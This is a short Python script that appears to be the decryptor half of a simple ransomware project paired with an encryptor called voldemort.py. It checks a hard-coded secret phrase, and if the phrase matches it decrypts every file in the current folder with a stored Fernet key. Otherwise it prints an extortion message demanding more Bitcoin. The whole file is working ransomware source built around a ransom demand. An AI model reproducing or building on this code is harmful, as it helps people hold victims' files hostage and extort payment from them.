
import os 
from cryptography.fernet import Fernet
# This file does the opposite of ENCRYPTING
#lets find some files 

files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":	#if file  is voldemort.py, thekey.key or decrypt.key then dont add
		continue
	if os.path.isfile(file):	#iff it is a file add it to the list
		files.append(file)

print(files)


with open("thekey.key","rb") as key:
	secretkey = key.read()

secretphrase = "coffee"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
# this loop will go through each file in the files list and DECRYPT each one with the key
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Thanks sucka")
else: 
	print("WRONG!, SEND MORE BITCOIN")
